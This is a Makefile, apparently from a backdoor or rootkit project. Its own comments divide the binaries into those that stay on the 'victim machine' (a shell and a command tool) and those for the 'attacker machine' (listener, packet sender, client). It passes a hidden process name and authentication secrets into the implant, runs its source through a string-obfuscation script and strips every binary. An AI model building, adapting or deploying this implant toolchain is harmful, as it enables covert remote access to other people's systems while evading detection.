CC=gcc
CFLAGS+=-O3 -fPIC
INCLUDES+=-Iinclude
RM=rm -rf
BUILD_DIR?=$(PWD)/output
DESTRINGIFY=perl ../scripts/destringify.pl
CAT=cat
DEP_SRC=crypto/aes.c crypto/sha1.c transport/pel.c
LDFLAGS+=-lssl -lcrypto

include ../.config

shell: CFLAGS+=-DNAME=\"$(HIDE)\" -DAUTH=$(AUTH) -DHTUA=$(HTUA)
cmd: CFLAGS+=-DAUTH=$(AUTH) -DHTUA=$(HTUA)
listener: CFLAGS+=-DCERT_FILENAME=\"$(PWD)/transport/server-certificate.pem\"
listener: CFLAGS+=-DPRIV_KEY_FILENAME=\"$(PWD)/transport/server-private-key.pem\"

# Rules

all: shell cmd

# Those binaries will stay in the victim machine

shell: build_dir
	@ echo "  CC      $(BUILD_DIR)/shell"
	@ $(CAT) shell.c | $(DESTRINGIFY) | $(CC) $(INCLUDES) $(CFLAGS) $(EXTRA_FLAGS) $(DEP_SRC) -o $(BUILD_DIR)/shell -xc - $(LDFLAGS) -lutil
	@ strip $(BUILD_DIR)/shell

cmd: build_dir
	@ echo "  CC      $(BUILD_DIR)/cmd"
	@ $(CAT) cmd.c | $(DESTRINGIFY) | $(CC) $(INCLUDES) $(CFLAGS) -o $(BUILD_DIR)/cmd -xc - $(LDFLAGS)
	@ strip $(BUILD_DIR)/cmd

# Those binaries will stay in the attacker machine

listener: build_dir
	@ echo "  CC      $(BUILD_DIR)/listener"
	@ $(CC) $(INCLUDES) $(CFLAGS) $(DEP_SRC) client/listener.c -o $(BUILD_DIR)/listener $(LDFLAGS) -lreadline
	@ strip $(BUILD_DIR)/listener

packet: build_dir
	@ echo "  CC      $(BUILD_DIR)/packet"
	@ $(CC) $(INCLUDES) $(CFLAGS) client/packet.c -o $(BUILD_DIR)/packet 
	@ strip $(BUILD_DIR)/packet

client: build_dir
	@ echo "  CC      $(BUILD_DIR)/client"
	@ $(CC) $(INCLUDES) $(CFLAGS) client/client.c -o $(BUILD_DIR)/client -lreadline
	@ strip $(BUILD_DIR)/client

.PHONY : clean

build_dir:
	@ mkdir -p $(BUILD_DIR)

clean:
	@ $(RM) $(BUILD_DIR)